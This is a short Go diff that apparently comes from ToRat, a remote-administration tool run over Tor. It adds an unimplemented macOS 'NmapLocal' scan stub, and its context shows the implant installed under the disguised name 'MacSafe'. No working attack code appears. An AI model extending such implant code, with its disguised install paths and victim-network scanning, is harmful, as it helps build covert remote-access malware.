@@ -4,6 +4,8 @@ import (
 	"errors"
 	"os"
 	"path/filepath"
+
+	"github.com/lu4p/ToRat/shared"
 )
 
 var (
@@ -11,6 +13,14 @@ var (
 	PathExe      = filepath.Join(Path, "MacSafe")
 	HostnamePath = filepath.Join(Path, "token")
 )
+
+func (a *API) NmapLocal(v shared.Void, r *shared.NmapLocal) {
+	r.Range = GetLocalRange()
+	r.TimeElapsed = 0
+	r.Hosts = 0
+	r.Scan = "Nmap on MAC is NOT supported yet!"
+	return
+}
 
 // GetVer gets the major version of the current installed OSX
 func GetVer() (int, error) {
